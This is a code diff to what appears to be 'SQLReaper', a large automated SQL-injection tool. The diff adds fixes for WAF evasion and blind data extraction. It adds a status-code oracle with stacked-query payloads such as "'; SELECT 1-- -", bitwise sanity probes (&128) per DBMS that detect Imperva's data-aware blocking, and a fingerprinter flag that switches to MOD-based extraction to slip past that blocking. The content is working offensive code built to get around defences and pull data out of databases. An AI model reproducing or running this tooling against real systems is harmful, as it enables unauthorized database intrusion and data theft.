@@ -1,10 +1,64 @@
 #!/usr/bin/env python3
 r"""
 ╔════════════════════════════════════════════════════════════════════════════════════╗
-║  SQLReaper v214 — PRODUCTION ROOT-CAUSE INVESTIGATION (August 12, 2026)         ║
+║  SQLReaper v215 — PRODUCTION ROOT-CAUSE INVESTIGATION (August 13, 2026)         ║
 ║  v214 base + 7 additional bugs fixed (deep audit of PCV, S-technique, race       ║
-║  conditions, and benign-oracle correctness). All found by fresh direct            ║
-║  line-by-line code reading — zero changelog reliance.                             ║
+║  conditions, and benign-oracle correctness). v215 adds 3 more root-cause fixes   ║
+║  targeting the silent-WAF FP cycle, RC-2 blind spot, and Imperva minority vote.  ║
+║                                                                                    ║
+║  ══════════════════════════════════════════════════════════════════════════════ ║
+║  FRESH EXAMINATION AUDIT (v214.1 → v215) — 3 BUGS FIXED                         ║
+║  ══════════════════════════════════════════════════════════════════════════════ ║
+║                                                                                    ║
+║  [✓] BUG-V215-1: S-clean false positive on path-injection surfaces with silent  ║
+║      WAF (HTTP 200 on blocked payloads). The false-cond clean probe ('; SELECT  ║
+║      1=2-- -) is WAF-blocked and returned as HTTP 200 with body similar to       ║
+║      baseline (diff ≤ 0.20). Existing _s_clean_diff2 > 0.20 check does NOT fire ║
+║      → "clean probe OK" → FP passed to PCV. PCV correctly rejects via benign    ║
+║      oracle, but the FP→PCV→reject cycle repeated for every payload in the       ║
+║      detection loop, wasting 10,000+ requests without real injection found;      ║
+║      CRITICAL; S technique; path-injection surfaces; all DBMSes; silent WAF.    ║
+║      Root cause: no STATUS CODE ORACLE in S-clean check. The detection probe     ║
+║      returned non-2xx (path corruption evidence: ';' in URL → 404) while the    ║
+║      clean probe returned 2xx (silent WAF blocking) — ambiguity unresolved.      ║
+║      Fix: when _s_is_path_inj=True, detection probe returned non-2xx non-WAF,   ║
+║      clean probe returned 2xx, and diff ≤ 0.20: send benign stacked probe        ║
+║      ('; SELECT 1-- -) as oracle. If benign also returns non-2xx non-WAF →       ║
+║      path-manipulation FP confirmed; set _s_clean_ok=False here, avoiding PCV   ║
+║      entirely and short-circuiting the 10k-request FP cycle.                    ║
+║                                                                                    ║
+║  [✓] BUG-V215-2: RC-2 cross-complementary bitwise sanity check (mask=8) has a  ║
+║      50% false-negative rate. RC-2A sends &8=8 and &8=0 at pos=1 to detect      ║
+║      data-aware Imperva blocking. When bit3 of the first extracted character IS  ║
+║      set (chars h-o: ASCII 104-111, common in database/username strings), &8=8   ║
+║      returns True for BOTH WAF-block and SQL-correct reasons — indistinguishable ║
+║      → RC-2A does not fire → native bitwise starts → garbage chars produced for ║
+║      positions where bit3=0 → _bw_equality_restart fires after ~8 wrong chars;  ║
+║      HIGH; bitwise extraction; all DBMSes; data-aware Imperva WAF.               ║
+║      Root cause: RC-2A relies on a single bit position (bit3) whose SQL value    ║
+║      is unknown at test time; when that bit IS set, WAF-block ≡ SQL-correct.    ║
+║      Fix: add RC-2B using mask=128 (0x80, also contains hex-8 → Imperva-blocked)║
+║      ALL 7-bit printable ASCII chars have bit7=0 → &128=128 is ALWAYS SQL-False ║
+║      and &128=0 is ALWAYS SQL-True. If both return True → data-aware Imperva    ║
+║      blocking confirmed for ANY 7-bit ASCII first char. RC-2B eliminates the    ║
+║      RC-2A blind spot for chars h-o.                                             ║
+║                                                                                    ║
+║  [✓] BUG-V215-3: ML WAF fingerprinter discards Imperva minority vote. When      ║
+║      Imperva gets ≥2 probe votes out of 5 but does not win the plurality (e.g.  ║
+║      log.txt: Imperva=2, ModSecurity/Apache=3), the minority signal is fully     ║
+║      discarded. Extraction starts with native bitwise (&mask=mask) which is      ║
+║      selectively blocked by Imperva at real data positions → garbage → modbit   ║
+║      restart. RC-1/RC-2 sanity checks at pos=9999 cannot detect this because    ║
+║      Imperva is data-aware (only blocks when actual data values are present);    ║
+║      HIGH; bitwise extraction; all DBMSes; Imperva data-aware WAF.               ║
+║      Root cause: ML fingerprinter only stored the plurality winner (_ACTIVE_WAF_ ║
+║      NAME) and confidence; minority votes were discarded after majority-vote     ║
+║      selection with no downstream persistence.                                   ║
+║      Fix: add global _IMPERVA_MINORITY_ACTIVE flag set when Imperva/Incapsula   ║
+║      gets ≥2 ML probe votes even if not the plurality winner. Extraction sanity  ║
+║      setup checks this flag and immediately sets _bitwise_oracle_sane=False,    ║
+║      switching directly to MOD-based extraction without running RC-1/RC-2 probes ║
+║      (which would give false "sane" result for data-aware Imperva anyway).       ║
 ║                                                                                    ║
 ║  ══════════════════════════════════════════════════════════════════════════════ ║
 ║  FRESH EXAMINATION AUDIT (v214 → v214.1) — 7 BUGS FIXED                         ║
@@ -30026,6 +30080,10 @@ class APIEndpointDiscovery:
 # call sites so every scanner path gets WAF-specific tamper recommendations
 # even when WAFDetector.detect() returns name=None on fully-403 targets.
 _ACTIVE_WAF_NAME: str = ""
+_IMPERVA_MINORITY_ACTIVE: bool = False  # BUG-V215-3: set True when Imperva gets ≥2 ML WAF votes
+                                         # even if another WAF wins plurality — used to pre-arm
+                                         # extraction to skip native bitwise (&mask=mask) and use
+                                         # MOD-based extraction immediately.
 
 WAF_SIGNATURES = [
     {"name":"Nginx WAF","status_codes":[403,444],
@@ -62904,7 +62962,19 @@ class Scanner:
             # as that would break normal application queries. Equality scan is slower (O(n)
             # per char) but reliable when bitwise is WAF-selectively blocked.
             _bitwise_oracle_sane = True  # assume sane until proven otherwise
-            if _use_bitwise_fallback and _boolean_oracle:
+            # BUG-V215-3 FIX: Pre-arm based on Imperva minority ML vote. When the global
+            # _IMPERVA_MINORITY_ACTIVE flag is set (Imperva got ≥2 ML probes even if not
+            # the plurality winner), data-aware &mask=mask blocking is likely. The RC-1/RC-2
+            # sanity probes at pos=9999 cannot detect this (Imperva only blocks at real data
+            # positions). Skip native bitwise immediately; use MOD-based extraction which
+            # avoids the & operator entirely and is immune to &mask=mask WAF rules.
+            if _use_bitwise_fallback and _boolean_oracle and _IMPERVA_MINORITY_ACTIVE:
+                LOG.warning("[Inference] %s: Imperva minority vote pre-arm — skipping native "
+                            "bitwise (&mask=mask); using MOD-based extraction directly. "
+                            "(RC-1/RC-2 sanity cannot detect data-aware Imperva at pos=9999.)",
+                            label)
+                _bitwise_oracle_sane = False
+            if _use_bitwise_fallback and _boolean_oracle and _bitwise_oracle_sane:
                 # BUG-BITWISE-WAF-DIFFERENTIAL-SANITY FIX v2 (CRITICAL): Use the ACTUAL
                 # extraction query in sanity probes instead of constant SQL expressions.
                 # Root cause: Imperva WAF (and similar) trigger on data-exfil patterns such as
@@ -63128,6 +63198,75 @@ class Scanner:
                         except Exception as _bw_rc2_exc:
                             LOG.debug("[Inference] %s: RC-2 sanity probe error (non-fatal): %s",
                                       label, _bw_rc2_exc)
+                    if _bitwise_oracle_sane:
+                        # BUG-V215-2 FIX — RC-2B: Second cross-complementary pair using mask=128
+                        # (0x80). RC-2A (mask=8) has a 50% false-negative rate: when bit3 of the
+                        # first extracted character IS set (e.g. 'h'-'o'=104-111), both &8=8 and
+                        # &8=0 return their normal SQL values even with Imperva blocking, so RC-2A
+                        # cannot distinguish blocked vs unblocked — it appears "sane" even when
+                        # native bitwise is producing garbage for positions where bit3=0.
+                        #
+                        # Fix: Add mask=128 (0x80 also contains hex-8 → Imperva-blocked). Crucially,
+                        # ALL 7-bit printable ASCII characters (0x20–0x7F: a-z, A-Z, 0-9, symbols)
+                        # have bit7=0, so:
+                        #   A128: ascii_fn(pos=1)&128=128  → ALWAYS SQL-False (bit7=0 for all ASCII)
+                        #   B128: ascii_fn(pos=1)&128=0    → ALWAYS SQL-True  (bit7=0 for all ASCII)
+                        # If Imperva blocks &128=128 at pos=1 (real data present) → A128=True(WAF)
+                        # AND B128=True(SQL-correct) → BOTH True → impossible in SQL → detected.
+                        # This catches data-aware Imperva for ANY 7-bit ASCII first char, covering
+                        # the 50% RC-2A blind spot (chars h-o where bit3=1).
+                        try:
+                            if _dbms == "Oracle":
+                                _bw_rc2b_a = await _cached_eval(
+                                    f"BITAND({_bw_san_ascii},128)=128")
+                                _bw_rc2b_b = await _cached_eval(
+                                    f"BITAND({_bw_san_ascii},128)=0")
+                            elif _dbms == "Firebird":
+                                _bw_rc2b_a = await _cached_eval(
+                                    f"BIN_AND({_bw_san_ascii},128)=128")
+                                _bw_rc2b_b = await _cached_eval(
+                                    f"BIN_AND({_bw_san_ascii},128)=0")
+                            elif _dbms == "ClickHouse":
+                                _bw_rc2b_a = await _cached_eval(
+                                    f"bitAnd({_bw_san_ascii},128)=128")
+                                _bw_rc2b_b = await _cached_eval(
+                                    f"bitAnd({_bw_san_ascii},128)=0")
+                            else:
+                                _bw_rc2b_a = await _cached_eval(
+                                    f"{_bw_san_ascii}&128=128")   # SQL-always-False; WAF-blocked by Imperva
+                                _bw_rc2b_b = await _cached_eval(
+                                    f"{_bw_san_ascii}&128=0")     # SQL-always-True;  not blocked
+                            if _bw_rc2b_a is True and _bw_rc2b_b is True:
+                                # SQL-impossible: &128=128 (SQL-False for 7-bit ASCII) AND
+                                # &128=0 (SQL-True for 7-bit ASCII) cannot both be True.
+                                # Imperva blocked &128=128 at pos=1 (real data present) →
+                                # returned True (block status). Data-aware WAF confirmed.
+                                LOG.warning("[Inference] %s: BITWISE oracle sanity FAILED "
+                                            "(RC-2B: mask=128 cross-complementary — "
+                                            "&128=128 and &128=0 both returned True at pos=1. "
+                                            "All 7-bit ASCII chars have bit7=0, so &128=128 is "
+                                            "SQL-always-False and &128=0 is SQL-always-True; "
+                                            "both True means Imperva data-aware WAF is blocking "
+                                            "'&mask=mask' form (0x80 contains hex-8) at real "
+                                            "data positions. RC-2A (mask=8) missed this because "
+                                            "bit3 of first char is 1 (chars h-o). "
+                                            "Switching to MOD-based extraction.)",
+                                            label)
+                                _bitwise_oracle_sane = False
+                            elif _bw_rc2b_a is None and _bw_rc2b_b is True:
+                                # &128=128 ambiguous (blocked/ambiguous) but &128=0 returned True
+                                # (SQL-correct). Selective blocking of &128=128 at real positions.
+                                LOG.warning("[Inference] %s: BITWISE oracle sanity UNCERTAIN "
+                                            "(RC-2B: mask=128 — &128=128→None, &128=0→True; "
+                                            "WAF selectively blocking &128=128 form at real "
+                                            "data positions). Switching to MOD-based extraction.",
+                                            label)
+                                _bitwise_oracle_sane = False
+                            # Both False or (_bw_rc2b_a=False, _bw_rc2b_b=True) → sane
+                            # (bit7 truly=0 and WAF not blocking → normal correct SQL results)
+                        except Exception as _bw_rc2b_exc:
+                            LOG.debug("[Inference] %s: RC-2B sanity probe error (non-fatal): %s",
+                                      label, _bw_rc2b_exc)
                     if _bitwise_oracle_sane and _bw_san_r is None:
                         # PRIMARY probe ambiguous (blocked). Verify oracle health with always-true probe.
                         if _dbms == "Oracle":
@@ -97859,6 +97998,28 @@ class MLWAFFingerprinter:
         # Store globally so best_tamper_chain() has the WAF name from any call site
         global _ACTIVE_WAF_NAME
         _ACTIVE_WAF_NAME = _best_waf if _best_waf != "Unknown" else _ACTIVE_WAF_NAME
+        # BUG-V215-3 FIX: Track Imperva minority vote. When Imperva/Incapsula gets ≥2
+        # probe votes even if it does not win the plurality (e.g. 2/5 Imperva + 3/5
+        # ModSec), data-aware Imperva-style &mask=mask blocking is present. Set a global
+        # flag so the extraction bitwise sanity setup can pre-arm _bitwise_oracle_sane=False
+        # immediately, skipping native bitwise entirely and avoiding the garbage→restart
+        # cycle (RC-1/RC-2 sanity at pos=9999 cannot detect data-aware blocking because
+        # Imperva's rule only fires when real data is being extracted, not at empty positions).
+        global _IMPERVA_MINORITY_ACTIVE
+        _imperva_vote_count = sum(
+            len(_votes[k]) for k in _votes
+            if 'imperva' in k.lower() or 'incapsula' in k.lower()
+        )
+        _imperva_is_winner = ('imperva' in _best_waf.lower() or 'incapsula' in _best_waf.lower())
+        if _imperva_vote_count >= 2 and not _imperva_is_winner:
+            _IMPERVA_MINORITY_ACTIVE = True
+            LOG.warning(
+                "ML WAF: Imperva minority vote (%d/%d probes; winner=%s). "
+                "Pre-arming data-aware WAF extraction guard — native bitwise "
+                "(&mask=mask) will be skipped in favour of MOD-based extraction.",
+                _imperva_vote_count, _n_probes_ok, _best_waf)
+        else:
+            _IMPERVA_MINORITY_ACTIVE = False
         return _best_waf, confidence
 
 
@@ -125289,6 +125450,104 @@ class TechniqueCascadeEngine:
                                         print(f"    [S-clean] ({_s_ctype}) false-cond also differs from "
                                               f"baseline (diff={_s_clean_diff2:.3f})  "
                                               "path-manipulation FP rejected")
+                                    elif (_s_is_path_inj and not _s_clean_fallback
+                                          and not has_err and _s_clean_diff2 <= 0.20):
+                                        # BUG-V215-1 FIX — S-CLEAN SILENT-WAF STATUS ORACLE
+                                        # (CRITICAL; S technique; path-injection; all DBMSes; silent WAF):
+                                        #
+                                        # On path-injection surfaces with a silent WAF (HTTP 200 on
+                                        # blocked), the false-cond clean probe (`'; SELECT 1=2-- -`)
+                                        # can be WAF-blocked and returned with HTTP 200 + a body that
+                                        # closely resembles the baseline (either WAF serves the cached
+                                        # real page, or the WAF error page has low SimHash distance from
+                                        # baseline). The existing diff check (_s_clean_diff2 > 0.20) does
+                                        # NOT fire → "clean probe OK" → FP passes to PCV.
+                                        #
+                                        # PCV S→T-CANARY correctly rejects the FP (benign oracle shows
+                                        # ';' causes non-2xx = path corruption), but the FP→PCV→reject
+                                        # cycle repeats for every payload in the loop, wasting 10,000+
+                                        # requests on a single scan without real injection found.
+                                        #
+                                        # Fix: When on a path-injection surface and:
+                                        #   1. The detection probe (`fp`) returned non-2xx non-WAF status
+                                        #      (path corruption evidence — e.g. 404 from ';' in URL path),
+                                        #   2. The clean probe returned 2xx (possible silent WAF block), AND
+                                        #   3. _s_clean_diff2 ≤ 0.20 (clean probe body looks like baseline),
+                                        # send a BENIGN stacked probe ('; SELECT 1-- -, no SLEEP/timing
+                                        # keywords) to resolve the ambiguity:
+                                        #   - Path manipulation FP: ';' ALWAYS corrupts the URL path →
+                                        #     benign probe ALSO returns non-2xx (same path routing failure).
+                                        #     Silent WAF passes benign probe (no dangerous keywords) OR
+                                        #     blocks it (but returns WAF status, not path-corruption status).
+                                        #   - Real injection: ';' is SQL-processed (not URL-corrupting) →
+                                        #     benign probe returns 2xx (backend processes stacked query
+                                        #     normally). WAF may or may not block, but path routing is fine.
+                                        # Decision: if benign probe returns non-2xx non-WAF → FP confirmed
+                                        # (path manipulation). Set _s_clean_ok=False here, avoid PCV entirely,
+                                        # saving the full PCV probe budget (4+ probes + overhead) per FP.
+                                        _spi_waf_sts_sc = (400, 403, 406, 429, 430, 444, 451)
+                                        _s_det_sc = getattr(fp, 'status_code', None)
+                                        _s_cln_sc = getattr(_s_fp_clean, 'status_code', None)
+                                        _s_det_is_path_err = (
+                                            _s_det_sc is not None and
+                                            not (200 <= _s_det_sc < 300) and
+                                            _s_det_sc not in _spi_waf_sts_sc
+                                        )
+                                        _s_cln_is_2xx = (
+                                            _s_cln_sc is not None and
+                                            200 <= _s_cln_sc < 300
+                                        )
+                                        if _s_det_is_path_err and _s_cln_is_2xx and not _SCAN_STOPPED[0]:
+                                            # Status code mismatch: detection probe returned a non-2xx
+                                            # non-WAF status (path routing failure from ';' corruption)
+                                            # but the false-cond clean probe returned 2xx (possible silent
+                                            # WAF blocking returning baseline-like 200 response).
+                                            # Resolve with benign stacked oracle.
+                                            _dbms_upper_sw = (dbms or '').upper()
+                                            if 'ORACLE' in _dbms_upper_sw:
+                                                _s_sw_benign_pay = "'; SELECT 1 FROM DUAL-- -"
+                                            else:
+                                                _s_sw_benign_pay = "'; SELECT 1-- -"
+                                            _s_sw_resp = await self._safe_confirm(
+                                                method, url, data, data_fmt, param,
+                                                original + _s_sw_benign_pay, self.tamper_chain)
+                                            if _s_sw_resp:
+                                                self._total_reqs += 1
+                                                _s_sw_st = getattr(_s_sw_resp, 'status_code', None)
+                                                _s_sw_is_path_manip = (
+                                                    _s_sw_st is not None and
+                                                    not (200 <= _s_sw_st < 300) and
+                                                    _s_sw_st not in _spi_waf_sts_sc
+                                                )
+                                                if _s_sw_is_path_manip:
+                                                    # Benign probe ALSO returned a non-2xx non-WAF
+                                                    # status → ';' corrupts the URL path regardless of
+                                                    # SQL content → path-manipulation FP confirmed.
+                                                    # The silent WAF intercepted the false-cond clean
+                                                    # probe (less obfuscated) and returned 200 with
+                                                    # baseline-like body, masking the true path corruption.
+                                                    _s_clean_ok = False
+                                                    print(
+                                                        f"    [S-clean] ({_s_ctype}) SILENT-WAF-ORACLE: "
+                                                        f"benign ';' → {_s_sw_st} (non-2xx non-WAF) = "
+                                                        f"path-manipulation FP; silent WAF blocked clean "
+                                                        f"probe (det={_s_det_sc} clean={_s_cln_sc} "
+                                                        f"diff={_s_clean_diff2:.3f}) → FP rejected at "
+                                                        "S-clean (no PCV needed)")
+                                                else:
+                                                    # Benign probe returned 2xx or WAF status → ';' is
+                                                    # being SQL-processed OR WAF blocks everything stacked.
+                                                    # Cannot confirm path-manipulation FP here; proceed.
+                                                    print(
+                                                        f"    [S-clean] ({_s_ctype}) SILENT-WAF-ORACLE: "
+                                                        f"benign ';' → {_s_sw_st} (not path-manip) → "
+                                                        f"clean probe OK (status: det={_s_det_sc} "
+                                                        f"clean={_s_cln_sc} diff={_s_clean_diff2:.3f})")
+                                        if _s_clean_ok:
+                                            print(
+                                                f"    [S-clean] ({_s_ctype}) clean probe OK "
+                                                f"(path-inj diff={_s_clean_diff2:.3f} "
+                                                f"det={_s_det_sc} clean={_s_cln_sc})")
                                     else:
                                         print(f"    [S-clean] ({_s_ctype}) clean probe OK")
                             if _s_clean_ok:
